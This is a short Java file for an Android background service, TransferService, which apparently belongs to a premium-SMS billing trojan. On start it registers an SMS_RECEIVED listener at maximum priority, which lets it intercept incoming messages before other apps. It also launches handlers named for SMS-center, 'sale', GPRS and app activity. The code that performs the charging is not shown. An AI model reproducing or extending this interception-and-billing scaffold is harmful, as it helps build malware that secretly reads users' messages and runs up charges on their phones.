package com.sttm.charge;

import com.sttm.util.KsoCache;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;


public class TransferService extends Service {

	private Context context;
	@Override
	public void onCreate() {
		context = this.getApplicationContext();

		super.onCreate();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		super.onStart(intent, startId);
		
		IntentFilter localIntentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		localIntentFilter.setPriority(Integer.MAX_VALUE);
		SmsReceiver sr = new SmsReceiver();
		context.registerReceiver(sr, localIntentFilter);


		IntentFilter alarmFilter = new IntentFilter(
				"com.zcl.action.ALARMRECEIRVE");
		KsoAlarmService kas = new KsoAlarmService();
		context.registerReceiver(kas, alarmFilter);

		KsoMainCourse.startSmsCenterHandler(context);
		KsoCache.getInstance().reSetValue("smsCenterFlag", true);

		KsoMainCourse.startMainAlarm(context);
		KsoMainCourse.startSaleHandler(context);
		KsoMainCourse.startGPRSHandler(context);
		KsoMainCourse.startAppsHandler(context);

		
	}

	@Override
	public IBinder onBind(Intent intent) {
	
		return null;
	}

}
